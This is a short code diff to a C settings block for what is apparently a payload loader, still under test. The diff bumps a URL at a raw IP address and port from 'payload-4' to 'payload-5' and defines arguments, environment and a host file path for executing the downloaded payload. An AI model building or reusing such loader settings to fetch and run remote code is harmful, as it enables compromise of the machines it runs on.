@@ -4,7 +4,7 @@
 //---------------------------------------------------------------
 // EDIT PAYLOAD SETTINGS HERE
 
-#define PAYLOAD_URL "http://70.18.231.173:25566/api/testloader?send=payload-4" // URL to download the payload from
+#define PAYLOAD_URL "http://70.18.231.173:25566/api/testloader?send=payload-5" // URL to download the payload from
 #define PAYLOAD_ARGV {"example_argv1", "example_argv2", NULL} // arguments for the payload execution
 #define PAYLOAD_ENVP {NULL} // environment variables for the payload execution
 #define PATH_TO_WRITE "/home/rweiner/lindaaaa/test_files/test2.txt" // path to write payload to on host disk (if not executable)
